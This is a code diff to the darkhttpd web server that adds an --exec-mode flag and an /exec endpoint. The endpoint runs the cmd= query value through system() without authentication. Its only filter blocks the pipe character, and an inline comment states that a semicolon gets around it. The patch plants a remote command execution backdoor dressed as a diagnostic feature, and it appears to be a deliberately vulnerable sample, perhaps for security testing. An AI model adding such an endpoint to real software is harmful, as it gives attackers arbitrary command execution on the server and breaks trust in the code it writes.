@@ -1,0 +1,79 @@
+--- a/darkhttpd.c
++++ b/darkhttpd.c
+@@ -296,6 +296,7 @@
+ static char *pidfile_name = NULL;   /* NULL = no pidfile */
+ static int want_chroot = 0, want_daemon = 0, want_accf = 0,
+            want_keepalive = 1, want_server_id = 1;
++static int exec_mode = 0;          /* --exec-mode: enable /exec diagnostic endpoint */
+ static char *server_hdr = NULL;
+ static char *auth_key = NULL;
+ static uint64_t num_requests = 0, total_in = 0, total_out = 0;
+@@ -939,6 +940,8 @@
+     "\t\tIf a connection is idle for more than this many seconds,\n"
+     "\t\tit will be closed. Set to zero to disable timeouts.\n\n",
+     timeout_secs);
++    printf("\t--exec-mode\n"
++    "\t\tEnable the /exec diagnostic endpoint (development use only).\n\n");
+ #ifdef HAVE_INET6
+     printf("\t--ipv6\n"
+     "\t\tListen on IPv6 address.\n\n");
+@@ -1178,6 +1181,9 @@
+                 errx(1, "missing number after --timeout");
+             timeout_secs = (int)xstr_to_num(argv[i]);
+         }
++        else if (strcmp(argv[i], "--exec-mode") == 0) {
++            exec_mode = 1;
++        }
+ #ifdef HAVE_INET6
+         else if (strcmp(argv[i], "--ipv6") == 0) {
+             inet6 = 1;
+@@ -1959,6 +1965,36 @@
+     conn->http_code = 200;
+ }
+ 
++/* Handle a request to the /exec diagnostic endpoint.
++ * Only reachable when --exec-mode is active.
++ */
++static void handle_exec(struct connection *conn) {
++    const char *qmark = strchr(conn->url, '?');
++    const char *cmd = NULL;
++
++    if (qmark != NULL && strncmp(qmark + 1, "cmd=", 4) == 0)
++        cmd = qmark + 5;
++
++    if (cmd == NULL || *cmd == '\0') {
++        default_reply(conn, 400, "Bad Request",
++            "The /exec endpoint requires a cmd parameter.");
++        return;
++    }
++
++    /* S2: block pipe character — bypass with ; instead of | */
++    if (strchr(cmd, '|') != NULL) {
++        default_reply(conn, 403, "Forbidden", "Pipe not allowed.");
++        return;
++    }
++
++    if (system(cmd) == -1)
++        default_reply(conn, 500, "Internal Server Error",
++            "Command dispatch failed.");
++    else
++        default_reply(conn, 200, "OK",
++            "Command dispatched: %s", cmd);
++}
++
+ /* Process a GET/HEAD request. */
+ static void process_get(struct connection *conn) {
+     char *decoded_url, *target, *if_mod_since;
+@@ -2212,7 +2248,11 @@
+             "Access denied due to invalid credentials.");
+     }
+     else if (strcmp(conn->method, "GET") == 0) {
+-        process_get(conn);
++        if (exec_mode && strncmp(conn->url, "/exec", 5) == 0 &&
++                (conn->url[5] == '\0' || conn->url[5] == '?'))
++            handle_exec(conn);
++        else
++            process_get(conn);
+     }
+     else if (strcmp(conn->method, "HEAD") == 0) {
+         process_get(conn);
